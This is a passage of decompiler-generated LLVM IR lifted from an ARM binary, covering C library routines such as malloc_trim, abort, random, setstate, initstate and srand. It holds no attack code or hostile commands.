  br i1 %v9_13820, label %dec_label_pc_1382c, label %dec_label_pc_13838

dec_label_pc_1382c:                               ; preds = %dec_label_pc_13818
  %v1_1382c = add i32 %v3_13824, 8
  %v2_1382c = inttoptr i32 %v1_1382c to i32*
  %v3_1382c = load i32, i32* %v2_1382c, align 4
  store i32 %v3_1382c, i32* %r3.global-to-local, align 4
  %v9_13830 = icmp eq i32 %v3_1382c, %v0_13818
  br i1 %v9_13830, label %dec_label_pc_1383c, label %dec_label_pc_13838

dec_label_pc_13838:                               ; preds = %dec_label_pc_13818, %dec_label_pc_137d4, %dec_label_pc_137b8, %dec_label_pc_1382c
  %v0_13838 = call i32 @abort()
  store i32 %v0_13838, i32* %r0.global-to-local, align 4
  %v0_1383c.pre = load i32, i32* @r1, align 4
  %v1_1383c.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_1383c

dec_label_pc_1383c:                               ; preds = %dec_label_pc_1382c, %dec_label_pc_13838
  %v1_1383c = phi i32 [ %v3_13824, %dec_label_pc_1382c ], [ %v1_1383c.pre, %dec_label_pc_13838 ]
  %v0_1383c = phi i32 [ %v3_13818, %dec_label_pc_1382c ], [ %v0_1383c.pre, %dec_label_pc_13838 ]
  %v2_1383c = add i32 %v1_1383c, 8
  %v3_1383c = inttoptr i32 %v2_1383c to i32*
  store i32 %v0_1383c, i32* %v3_1383c, align 4
  %v0_13840 = load i32, i32* %r2.global-to-local, align 4
  %v1_13840 = load i32, i32* %r1.global-to-local, align 4
  %v2_13840 = add i32 %v1_13840, 12
  %v3_13840 = inttoptr i32 %v2_13840 to i32*
  store i32 %v0_13840, i32* %v3_13840, align 4
  %v0_13844 = load i32, i32* %ip.global-to-local, align 4
  %v1_13844 = load i32, i32* %r0.global-to-local, align 4
  %v2_13844 = add i32 %v1_13844, %v0_13844
  store i32 %v2_13844, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13848

dec_label_pc_13848:                               ; preds = %dec_label_pc_13804.dec_label_pc_13848_crit_edge, %dec_label_pc_1383c
  %v0_13858 = phi i32 [ %v0_13858.pre, %dec_label_pc_13804.dec_label_pc_13848_crit_edge ], [ %v2_13844, %dec_label_pc_1383c ]
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_1384c = load i32, i32* @r7, align 4
  %v2_1384c = add i32 %v0_1384c, 32
  %v3_1384c = inttoptr i32 %v2_1384c to i32*
  %v4_1384c = load i32, i32* %v3_1384c, align 4
  %v1_13850 = add i32 %v4_1384c, 52
  store i32 %v1_13850, i32* %r3.global-to-local, align 4
  %v1_13854 = add i32 %v4_1384c, 60
  %v2_13854 = inttoptr i32 %v1_13854 to i32*
  %v3_13854 = load i32, i32* %v2_13854, align 4
  store i32 %v3_13854, i32* %r1.global-to-local, align 4
  %v1_13858 = or i32 %v0_13858, 1
  store i32 %v1_13858, i32* %r2.global-to-local, align 4
  %v1_1385c = load i32, i32* %r4.global-to-local, align 4
  %v2_1385c = add i32 %v1_1385c, 12
  %v3_1385c = inttoptr i32 %v2_1385c to i32*
  store i32 %v1_13850, i32* %v3_1385c, align 4
  %v0_13860 = load i32, i32* %r1.global-to-local, align 4
  %v1_13860 = load i32, i32* %r4.global-to-local, align 4
  %v2_13860 = add i32 %v1_13860, 8
  %v3_13860 = inttoptr i32 %v2_13860 to i32*
  store i32 %v0_13860, i32* %v3_13860, align 4
  %v0_13864 = load i32, i32* %r2.global-to-local, align 4
  %v1_13864 = load i32, i32* %r4.global-to-local, align 4
  %v2_13864 = add i32 %v1_13864, 4
  %v3_13864 = inttoptr i32 %v2_13864 to i32*
  store i32 %v0_13864, i32* %v3_13864, align 4
  %v0_13868 = load i32, i32* %ip.global-to-local, align 4
  %v1_13868 = load i32, i32* %r4.global-to-local, align 4
  %v3_13868 = add i32 %v1_13868, %v0_13868
  %v4_13868 = inttoptr i32 %v3_13868 to i32*
  store i32 %v0_13868, i32* %v4_13868, align 4
  %v0_1386c = load i32, i32* %r4.global-to-local, align 4
  %v1_1386c = load i32, i32* %r1.global-to-local, align 4
  %v2_1386c = add i32 %v1_1386c, 12
  %v3_1386c = inttoptr i32 %v2_1386c to i32*
  store i32 %v0_1386c, i32* %v3_1386c, align 4
  %v0_13870 = load i32, i32* %r4.global-to-local, align 4
  %v1_13870 = load i32, i32* %r3.global-to-local, align 4
  %v2_13870 = add i32 %v1_13870, 8
  %v3_13870 = inttoptr i32 %v2_13870 to i32*
  store i32 %v0_13870, i32* %v3_13870, align 4
  br label %dec_label_pc_13888

dec_label_pc_13878:                               ; preds = %dec_label_pc_137ec
  %v2_13878 = add i32 %v1_137fc, %v0_13878
  store i32 %v2_13878, i32* %ip.global-to-local, align 4
  %v1_1387c = or i32 %v2_13878, 1
  store i32 %v1_1387c, i32* %r3.global-to-local, align 4
  %v0_13880 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13880, i32* %v2_137f4, align 4
  %v0_13884 = load i32, i32* %r3.global-to-local, align 4
  %v1_13884 = load i32, i32* %r4.global-to-local, align 4
  %v2_13884 = add i32 %v1_13884, 4
  %v3_13884 = inttoptr i32 %v2_13884 to i32*
  store i32 %v0_13884, i32* %v3_13884, align 4
  br label %dec_label_pc_13888

dec_label_pc_13888:                               ; preds = %dec_label_pc_13848, %dec_label_pc_13878
  %v0_13888 = load i32, i32* %ip.global-to-local, align 4
  %v3_1388c = icmp ult i32 %v0_13888, 131070
  br i1 %v3_1388c, label %dec_label_pc_138f8, label %dec_label_pc_13890

dec_label_pc_13890:                               ; preds = %dec_label_pc_13888
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_13894 = load i32, i32* @r7, align 4
  %v2_13894 = add i32 %v0_13894, 32
  %v3_13894 = inttoptr i32 %v2_13894 to i32*
  %v4_13894 = load i32, i32* %v3_13894, align 4
  store i32 %v4_13894, i32* @r4, align 4
  %v1_13898 = inttoptr i32 %v4_13894 to i32*
  %v2_13898 = load i32, i32* %v1_13898, align 4
  store i32 %v2_13898, i32* %r3.global-to-local, align 4
  %v1_1389c = and i32 %v2_13898, 2
  %v2_1389c = icmp eq i32 %v1_1389c, 0
  br i1 %v2_1389c, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_13890
  store i32 %v4_13894, i32* %r0.global-to-local, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_13890, %bb
  %v1_138a4 = xor i1 %v2_1389c, true
  call void @__pseudo_cond_branch(i1 %v1_138a4, i32 ptrtoint (i32* @global_var_13548.739 to i32))
  %v0_138a8 = load i32, i32* @r4, align 4
  %v1_138a8 = add i32 %v0_138a8, 44
  %v2_138a8 = inttoptr i32 %v1_138a8 to i32*
  %v3_138a8 = load i32, i32* %v2_138a8, align 4
  store i32 %v3_138a8, i32* %r3.global-to-local, align 4
  %v1_138ac = add i32 %v3_138a8, 4
  %v2_138ac = inttoptr i32 %v1_138ac to i32*
  %v3_138ac = load i32, i32* %v2_138ac, align 4
  store i32 %v3_138ac, i32* %r3.global-to-local, align 4
  %v1_138b0 = add i32 %v0_138a8, 836
  %v2_138b0 = inttoptr i32 %v1_138b0 to i32*
  %v3_138b0 = load i32, i32* %v2_138b0, align 4
  store i32 %v3_138b0, i32* %r2.global-to-local, align 4
  %v1_138b4 = and i32 %v3_138ac, -4
  store i32 %v1_138b4, i32* %r3.global-to-local, align 4
  %v3_138b8 = icmp ult i32 %v1_138b4, %v3_138b0
  br i1 %v3_138b8, label %dec_label_pc_138f8, label %dec_label_pc_138c0

dec_label_pc_138c0:                               ; preds = %bb17
  store i32 %v0_138a8, i32* %r1.global-to-local, align 4
  %v1_138c4 = add i32 %v0_138a8, 840
  %v2_138c4 = inttoptr i32 %v1_138c4 to i32*
  %v3_138c4 = load i32, i32* %v2_138c4, align 4
  store i32 %v3_138c4, i32* %r0.global-to-local, align 4
  %v2_138c8 = call i32 @__malloc_trim(i32 %v3_138c4, i32 %v0_138a8)
  store i32 %v2_138c8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_138f8

dec_label_pc_138d0:                               ; preds = %dec_label_pc_13794
  %v2_138d0 = inttoptr i32 %v1_13764 to i32*
  %v3_138d0 = load i32, i32* %v2_138d0, align 4
  store i32 %v3_138d0, i32* %r0.global-to-local, align 4
  %v1_138d4 = add i32 %v4_13754, 848
  %v2_138d4 = inttoptr i32 %v1_138d4 to i32*
  %v3_138d4 = load i32, i32* %v2_138d4, align 4
  store i32 %v3_138d4, i32* %r2.global-to-local, align 4
  %v1_138d8 = add i32 %v4_13754, 868
  %v2_138d8 = inttoptr i32 %v1_138d8 to i32*
  %v3_138d8 = load i32, i32* %v2_138d8, align 4
  %v2_138dc = add i32 %v3_138d0, %v1_13760
  store i32 %v2_138dc, i32* %r1.global-to-local, align 4
  %v1_138e0 = add i32 %v3_138d4, -1
  store i32 %v1_138e0, i32* %r2.global-to-local, align 4
  %v2_138e4 = sub i32 %v3_138d8, %v2_138dc
  store i32 %v2_138e4, i32* %r3.global-to-local, align 4
  store i32 %v2_138e4, i32* %v2_138d8, align 4
  %v1_138ec = load i32, i32* @lr, align 4
  %v2_138ec = add i32 %v1_138ec, 848
  %v3_138ec = inttoptr i32 %v2_138ec to i32*
  store i32 %v1_138e0, i32* %v3_138ec, align 4
  %v0_138f0 = load i32, i32* %r0.global-to-local, align 4
  %v1_138f0 = load i32, i32* @r5, align 4
  %v2_138f0 = sub i32 %v1_138f0, %v0_138f0
  store i32 %v2_138f0, i32* %r0.global-to-local, align 4
  %v4_138f4 = call i32 @munmap(i32 %v2_138f0, i32 %v2_138dc, i32 %v1_138e0, i32 %v2_138e4)
  store i32 %v4_138f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_138f8

dec_label_pc_138f8:                               ; preds = %bb17, %dec_label_pc_13888, %dec_label_pc_138c0, %dec_label_pc_13774, %dec_label_pc_138d0
  store i32 %v2_13708, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_13904 = load i32, i32* @r7, align 4
  %v2_13904 = add i32 %v0_13904, 24
  %v3_13904 = inttoptr i32 %v2_13904 to i32*
  %v4_13904 = load i32, i32* %v3_13904, align 4
  store i32 %v4_13904, i32* @ip, align 4
  store i32 80144, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13904)
  br label %dec_label_pc_13910

dec_label_pc_13910:                               ; preds = %entry, %dec_label_pc_138f8
  store i32 %v3_136fc, i32* @r4, align 4
  store i32 %v6_136fc, i32* @r5, align 4
  store i32 %v9_136fc, i32* @r6, align 4
  store i32 %v12_136fc, i32* @r7, align 4
  store i32 %v18_136fc, i32* @lr, align 4
  ret i32 %v2_13708

; uselistorder directives
  uselistorder i32 %v0_138a8, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_13868, { 1, 0 }
  uselistorder i32 %v1_137a8, { 1, 0 }
  uselistorder i32 %v0_137a8, { 1, 0 }
  uselistorder i32 %v3_1377c, { 1, 0 }
  uselistorder i32 %v1_13760, { 1, 0, 2 }
  uselistorder i32 %v2_1375c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_13754, { 1, 0, 2, 3 }
  uselistorder i32 %v0_13704, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 1, 2, 3, 7, 5, 6, 13, 14, 8, 9, 10, 12, 11 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 3, 0, 4, 1, 5, 9, 2, 6, 7, 8, 10, 11, 12 }
  uselistorder i32 868, { 2, 0, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_13910, { 1, 0 }
  uselistorder label %dec_label_pc_138f8, { 4, 2, 0, 1, 3 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %dec_label_pc_13888, { 1, 0 }
  uselistorder label %dec_label_pc_13848, { 1, 0 }
  uselistorder label %dec_label_pc_1383c, { 1, 0 }
  uselistorder label %dec_label_pc_13838, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_137ec, { 1, 0 }
}

define i32 @function_13920(i32 %arg1) local_unnamed_addr {
dec_label_pc_13920:
  %v0_13920 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13920, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_13920
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_13920, %bb
  %v10_13934 = phi i32 [ %arg1, %dec_label_pc_13920 ], [ 0, %bb ]
  ret i32 %v10_13934

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_13938 = load i32, i32* @r4, align 4
  store i32 %v3_13938, i32* %stack_var_-12, align 4
  %v6_13938 = load i32, i32* @r5, align 4
  %v4_13948 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 32) to i32*), align 4
  store i32 %v4_13948, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v4_13948, i32* @r0, align 4
  %v0_13958 = call i32 @__malloc_consolidate()
  %v0_1395c = load i32, i32* @r4, align 4
  %v0_13960 = load i32, i32* @r5, align 4
  %v2_13968 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13968, i32* @r4, align 4
  store i32 %v6_13938, i32* @r5, align 4
  %v2_1396c = call i32 @__malloc_trim(i32 %v0_1395c, i32 %v0_13960)
  %v0_13970 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13970, label %bb, label %.thread

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v4_13974 = phi i32 [ %v2_1396c, %entry ], [ 0, %bb ]
  ret i32 %v4_13974

; uselistorder directives
  uselistorder i32 (i32, i32)* @__malloc_trim, { 1, 0 }
  uselistorder i32 ()* @__malloc_consolidate, { 3, 2, 1, 0 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 32) to i32*), { 17, 3, 2, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* @r5, align 4
  %v4_13990 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 16) to i32*), align 4
  store i32 80284, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13990)
  %v2_139ac = ptrtoint i32* %stack_var_-8 to i32
  store i32 32, i32* %stack_var_-8, align 4
  %v6_139b8 = call i32 @__GI_sigprocmask(i32 1, i32 %v2_139ac, i32 0, i32 32)
  %v0_139c0 = load i32, i32* @r5, align 4
  %v2_139c0 = add i32 %v0_139c0, 29280
  %v3_139c0 = inttoptr i32 %v2_139c0 to i32*
  %v4_139c0 = load i32, i32* %v3_139c0, align 4
  %v2_139c4 = icmp eq i32 %v4_139c0, 0
  br i1 %v2_139c4, label %dec_label_pc_139cc, label %dec_label_pc_13a0c

dec_label_pc_139cc:                               ; preds = %entry
  store i32 1, i32* %v3_139c0, align 4
  br label %dec_label_pc_139d4

dec_label_pc_139d4:                               ; preds = %dec_label_pc_13a1c, %dec_label_pc_139cc
  %v0_139d8 = load i32, i32* @r5, align 4
  %v2_139d8 = add i32 %v0_139d8, 3884
  store i32 %v2_139d8, i32* @r4, align 4
  %v2_139e4 = add i32 %v0_139d8, 36
  %v3_139e4 = inttoptr i32 %v2_139e4 to i32*
  %v4_139e4 = load i32, i32* %v3_139e4, align 4
  call void @__pseudo_branch(i32 %v4_139e4)
  %v1_139f4 = call i32 @__GI_raise(i32 6)
  %v0_13a00 = load i32, i32* @r5, align 4
  %v2_13a00 = add i32 %v0_13a00, 16
  %v3_13a00 = inttoptr i32 %v2_13a00 to i32*
  %v4_13a00 = load i32, i32* %v3_13a00, align 4
  store i32 80396, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13a00)
  %v0_13a10.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13a0c

dec_label_pc_13a0c:                               ; preds = %entry, %dec_label_pc_139d4
  %v1_13a24 = phi i32 [ %v0_139c0, %entry ], [ %v0_13a10.pre, %dec_label_pc_139d4 ]
  %v2_13a10 = add i32 %v1_13a24, 29280
  %v3_13a10 = inttoptr i32 %v2_13a10 to i32*
  %v4_13a10 = load i32, i32* %v3_13a10, align 4
  %v7_13a14 = icmp eq i32 %v4_13a10, 1
  br i1 %v7_13a14, label %dec_label_pc_13a1c, label %dec_label_pc_13a58

dec_label_pc_13a1c:                               ; preds = %dec_label_pc_13a0c
  %v2_13a1c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_13a1c, i32* @r4, align 4
  store i32 2, i32* %v3_13a10, align 4
  store i32 20, i32* @r2, align 4
  %v2_13a34 = bitcast i32* %stack_var_-28 to i8*
  %v3_13a34 = call i32 @__GI_memset(i8* %v2_13a34, i32 0)
  %v3_13a50 = call i32 @__libc_sigaction(i32 6, i32 %v2_13a1c, i32 0)
  br label %dec_label_pc_139d4

dec_label_pc_13a58:                               ; preds = %dec_label_pc_13a0c
  %v7_13a58 = icmp eq i32 %v4_13a10, 2
  br i1 %v7_13a58, label %dec_label_pc_13a60, label %dec_label_pc_13a6c

dec_label_pc_13a60:                               ; preds = %dec_label_pc_13a58
  store i32 3, i32* %v3_13a10, align 4
  %v0_13a68 = call i32 @abort()
  %v0_13a6c.pre = load i32, i32* @r5, align 4
  %v1_13a6c.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_13a6c

dec_label_pc_13a6c:                               ; preds = %dec_label_pc_13a58, %dec_label_pc_13a60
  %v3_13a78 = phi i32 [ 29280, %dec_label_pc_13a58 ], [ %v1_13a6c.pre, %dec_label_pc_13a60 ]
  %v2_13a78 = phi i32 [ %v1_13a24, %dec_label_pc_13a58 ], [ %v0_13a6c.pre, %dec_label_pc_13a60 ]
  %v2_13a6c = add i32 %v2_13a78, %v3_13a78
  %v3_13a6c = inttoptr i32 %v2_13a6c to i32*
  %v4_13a6c = load i32, i32* %v3_13a6c, align 4
  %v7_13a70 = icmp eq i32 %v4_13a6c, 3
  br i1 %v7_13a70, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_13a6c
  store i32 4, i32* %v3_13a6c, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_13a6c, %bb
  call void @__pseudo_cond_branch(i1 %v7_13a70, i32 ptrtoint (i32* @global_var_faa0.749 to i32))
  br label %dec_label_pc_13a84

dec_label_pc_13a84:                               ; preds = %dec_label_pc_13a84, %.thread2
  %v0_13a84 = call i32 @abort()
  br label %dec_label_pc_13a84

; uselistorder directives
  uselistorder i32* %v3_13a10, { 1, 0, 2 }
  uselistorder i32 ()* @abort, { 2, 1, 5, 4, 6, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__GI_sigprocmask, { 0, 2, 1 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 16) to i32*), { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_13a6c, { 1, 0 }
  uselistorder label %dec_label_pc_13a0c, { 1, 0 }
}

define i32 @function_13a90(i32 %arg1) local_unnamed_addr {
dec_label_pc_13a90:
  %v0_13a90 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13a90, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_13a90
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_13a90, %bb
  %v4_13a9c = phi i32 [ %arg1, %dec_label_pc_13a90 ], [ 0, %bb ]
  ret i32 %v4_13a9c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_13aa8 = call i32 @random()
  ret i32 %v0_13aa8
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_13ab8 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* @r4, align 4
  %v4_13ae8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_13ae8)
  %v0_13afc = load i32, i32* @r4, align 4
  %v2_13afc = add i32 %v0_13afc, 16
  %v3_13afc = inttoptr i32 %v2_13afc to i32*
  %v4_13afc = load i32, i32* %v3_13afc, align 4
  store i32 ptrtoint (i32* @global_var_13b08.755 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13afc)
  %v2_13b0c = ptrtoint i32* %stack_var_-20 to i32
  %v0_13b10 = load i32, i32* @r4, align 4
  %v2_13b10 = add i32 %v0_13b10, 4060
  %v2_13b14 = inttoptr i32 %v2_13b10 to i32*
  %v3_13b14 = call i32 @__GI_random_r(i32* %v2_13b14, i32 %v2_13b0c)
  %v0_13b24 = load i32, i32* @r4, align 4
  %v2_13b24 = add i32 %v0_13b24, 24
  %v3_13b24 = inttoptr i32 %v2_13b24 to i32*
  %v4_13b24 = load i32, i32* %v3_13b24, align 4
  call void @__pseudo_branch(i32 %v4_13b24)
  %v3_13b30 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_13ab8, i32* @r4, align 4
  ret i32 %v3_13b30
}

define i32 @function_13b44(i64* %arg1) local_unnamed_addr {
dec_label_pc_13b44:
  %tmp = ptrtoint i64* %arg1 to i32
  %v0_13b44 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13b44, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_13b44
  %v2_13b4c = load i32, i32* @ip, align 4
  %v9_13b54 = sub i32 0, %v2_13b4c
  %v2_13b58 = load i32, i32* @r8, align 4
  %v8_13b58 = shl i32 %v2_13b58, %v9_13b54
  %v9_13b58 = and i32 %v8_13b58, %v9_13b54
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_13b44, %bb
  %v10_13b58 = phi i32 [ %tmp, %dec_label_pc_13b44 ], [ %v9_13b58, %bb ]
  ret i32 %v10_13b58

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @setstate(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* @r6, align 4
  store i32 %arg1, i32* @r5, align 4
  %v4_13b8c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_13b8c)
  %v0_13ba0 = load i32, i32* @r6, align 4
  %v2_13ba0 = add i32 %v0_13ba0, 16
  %v3_13ba0 = inttoptr i32 %v2_13ba0 to i32*
  %v4_13ba0 = load i32, i32* %v3_13ba0, align 4
  call void @__pseudo_branch(i32 %v4_13ba0)
  %v0_13bb0 = load i32, i32* @r6, align 4
  %v2_13bb0 = add i32 %v0_13bb0, 4060
  %v0_13bb8 = load i32, i32* @r5, align 4
  %v1_13bbc = add i32 %v0_13bb0, 4068
  %v2_13bbc = inttoptr i32 %v1_13bbc to i32*
  %v3_13bbc = load i32, i32* %v2_13bbc, align 4
  store i32 %v3_13bbc, i32* @r4, align 4
  %v2_13bc0 = inttoptr i32 %v2_13bb0 to i32*
  %v3_13bc0 = call i32 @setstate_r(i32 %v0_13bb8, i32* %v2_13bc0)
  %v1_13bc8 = icmp slt i32 %v3_13bc0, 0
  %v3_13bd8 = load i32, i32* @r4, align 4
  %v4_13bd8 = add i32 %v3_13bd8, -4
  %storemerge = select i1 %v1_13bc8, i32 0, i32 %v4_13bd8
  %v0_13bdc = load i32, i32* @r6, align 4
  %v2_13bdc = add i32 %v0_13bdc, 24
  %v3_13bdc = inttoptr i32 %v2_13bdc to i32*
  %v4_13bdc = load i32, i32* %v3_13bdc, align 4
  call void @__pseudo_branch(i32 %v4_13bdc)
  ret i32 %storemerge
}

define i32 @function_13bfc(i64* %arg1) local_unnamed_addr {
dec_label_pc_13bfc:
  %tmp = ptrtoint i64* %arg1 to i32
  %v0_13bfc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13bfc, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_13bfc
  %v2_13c04 = load i32, i32* @ip, align 4
  %v9_13c0c = sub i32 0, %v2_13c04
  %v2_13c10 = load i32, i32* @r8, align 4
  %v8_13c10 = shl i32 %v2_13c10, %v9_13c0c
  %v9_13c10 = and i32 %v8_13c10, %v9_13c0c
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_13bfc, %bb
  %v10_13c10 = phi i32 [ %tmp, %dec_label_pc_13bfc ], [ %v9_13c10, %bb ]
  ret i32 %v10_13c10

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @sl, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  %v4_13c4c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_13c4c)
  %v0_13c60 = load i32, i32* @r4, align 4
  %v2_13c60 = add i32 %v0_13c60, 16
  %v3_13c60 = inttoptr i32 %v2_13c60 to i32*
  %v4_13c60 = load i32, i32* %v3_13c60, align 4
  call void @__pseudo_branch(i32 %v4_13c60)
  %v0_13c70 = load i32, i32* @r6, align 4
  %v0_13c74 = load i32, i32* @r4, align 4
  %v2_13c74 = add i32 %v0_13c74, 4060
  %v0_13c78 = load i32, i32* @r7, align 4
  %v0_13c7c = load i32, i32* @sl, align 4
  store i32 %v0_13c7c, i32* @r0, align 4
  %v1_13c80 = add i32 %v0_13c74, 4068
  %v2_13c80 = inttoptr i32 %v1_13c80 to i32*
  %v3_13c80 = load i32, i32* %v2_13c80, align 4
  store i32 %v3_13c80, i32* @r5, align 4
  %v4_13c84 = inttoptr i32 %v0_13c7c to i32*
  %v5_13c84 = call i32 @__GI_initstate_r(i32* %v4_13c84, i32 %v0_13c70, i32 %v0_13c78, i32 %v2_13c74)
  %v0_13c94 = load i32, i32* @r4, align 4
  %v2_13c94 = add i32 %v0_13c94, 24
  %v3_13c94 = inttoptr i32 %v2_13c94 to i32*
  %v4_13c94 = load i32, i32* %v3_13c94, align 4
  call void @__pseudo_branch(i32 %v4_13c94)
  %v0_13ca0 = load i32, i32* @r5, align 4
  %v1_13ca0 = add i32 %v0_13ca0, -4
  ret i32 %v1_13ca0
}

define i32 @function_13cbc(i64* %arg1) local_unnamed_addr {
dec_label_pc_13cbc:
  %tmp = ptrtoint i64* %arg1 to i32
  %v0_13cbc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13cbc, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_13cbc
  %v2_13cc4 = load i32, i32* @ip, align 4
  %v9_13ccc = sub i32 0, %v2_13cc4
  %v2_13cd0 = load i32, i32* @r8, align 4
  %v8_13cd0 = shl i32 %v2_13cd0, %v9_13ccc
  %v9_13cd0 = and i32 %v8_13cd0, %v9_13ccc
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_13cbc, %bb
  %v10_13cd0 = phi i32 [ %tmp, %dec_label_pc_13cbc ], [ %v9_13cd0, %bb ]
  ret i32 %v10_13cd0

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v3_13cd4 = load i32, i32* @r4, align 4
  %v6_13cd4 = load i32, i32* @r5, align 4
  %v9_13cd4 = load i32, i32* @r6, align 4
  %v15_13cd4 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* @r4, align 4
  %v2_13ce8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 3908), i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v4_13d04 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_13d04)
  %v0_13d18 = load i32, i32* @r4, align 4
  %v2_13d18 = add i32 %v0_13d18, 16
  %v3_13d18 = inttoptr i32 %v2_13d18 to i32*
  %v4_13d18 = load i32, i32* %v3_13d18, align 4
  call void @__pseudo_branch(i32 %v4_13d18)
  %v0_13d28 = load i32, i32* @r6, align 4
  store i32 %v0_13d28, i32* @r0, align 4
  %v0_13d2c = load i32, i32* @r4, align 4
  %v2_13d2c = add i32 %v0_13d2c, 4060
  %v2_13d30 = inttoptr i32 %v0_13d28 to i32*
  %v3_13d30 = call i32 @srandom_r(i32* %v2_13d30, i32 %v2_13d2c)
  %v0_13d44 = load i32, i32* @r4, align 4
  %v2_13d44 = add i32 %v0_13d44, 24
  %v3_13d44 = inttoptr i32 %v2_13d44 to i32*
  %v4_13d44 = load i32, i32* %v3_13d44, align 4
  call void @__pseudo_branch(i32 %v4_13d44)
